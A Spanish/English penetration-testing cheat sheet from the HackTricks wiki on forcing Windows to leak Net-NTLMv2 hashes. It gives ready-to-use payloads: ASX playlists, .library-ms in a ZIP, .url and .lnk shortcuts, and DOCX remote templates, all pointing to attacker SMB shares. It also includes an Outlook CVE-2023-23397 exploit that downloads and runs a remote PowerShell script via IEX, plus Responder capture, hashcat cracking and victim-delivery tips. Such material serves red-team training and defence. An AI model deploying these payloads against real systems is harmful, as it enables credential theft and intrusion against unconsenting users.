# Lugares para robar NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Consulta todas las grandes ideas de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde la descarga de un archivo Microsoft Word en línea hasta la fuente de ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md y [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Si puedes lograr que un objetivo abra o previsualice una Windows Media Player playlist que controlas, puedes leak Net‑NTLMv2 apuntando la entrada a una UNC path. WMP intentará obtener el media referenciado vía SMB y se autenticará implícitamente.

Ejemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flujo de recopilación y cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

El Explorador de Windows maneja de forma insegura los archivos .library-ms cuando se abren directamente desde un archivo ZIP. Si la definición de la biblioteca apunta a una ruta UNC remota (p. ej., \\attacker\share), simplemente navegar/abrir el .library-ms dentro del ZIP hace que el Explorador enumere la UNC y emita autenticación NTLM al atacante. Esto genera un NetNTLMv2 que puede ser crackeado offline o potencialmente relayed.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Create the .library-ms file with the XML above (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows procesaba la propiedad MAPI extendida PidLidReminderFileParameter en los elementos del calendario. Si esa propiedad apunta a una ruta UNC (por ejemplo, \\attacker\share\alert.wav), Outlook contactaría la share SMB cuando se active el recordatorio, leakando el Net‑NTLMv2 del usuario sin ningún click. Esto se parcheó el 14 de marzo de 2023, pero sigue siendo muy relevante para flotas legacy/inalteradas y para la respuesta a incidentes histórica.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado del Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- Una víctima solo necesita tener Outlook for Windows en ejecución cuando se activa el recordatorio.
- El leak proporciona Net‑NTLMv2 adecuado para offline cracking o relay (no pass‑the‑hash).


### .LNK/.URL basado en iconos zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer renderiza automáticamente los iconos de los accesos directos. Investigaciones recientes mostraron que incluso después del parche de Microsoft de abril de 2025 para atajos UNC‑icon, todavía era posible desencadenar autenticación NTLM sin hacer clic alojando el objetivo del acceso directo en una ruta UNC y manteniendo el icono local (patch bypass asignado CVE‑2025‑50154). Simplemente ver la carpeta hace que Explorer recupere metadatos del objetivo remoto, emitiendo NTLM al servidor SMB del atacante.

Payload mínimo de Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de acceso directo de programa (.lnk) vía PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideas de entrega
- Coloca el acceso directo en un ZIP y consigue que la víctima lo explore.
- Coloca el acceso directo en un recurso compartido con permisos de escritura que la víctima abrirá.
- Combínalo con otros archivos de cebo en la misma carpeta para que Explorer previsualice los elementos.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Los documentos Office pueden referenciar una plantilla externa. Si configuras la plantilla adjunta a una ruta UNC, al abrir el documento se autenticará con SMB.

Minimal DOCX relationship changes (inside word/):

1) Edita word/settings.xml y añade la referencia a la plantilla adjunta:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edita word/_rels/settings.xml.rels y apunta rId1337 a tu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempaqueta a .docx y entrégalo. Ejecuta tu SMB capture listener y espera la apertura.

Para ideas posteriores a la captura sobre relaying o abuso de NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## Referencias
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
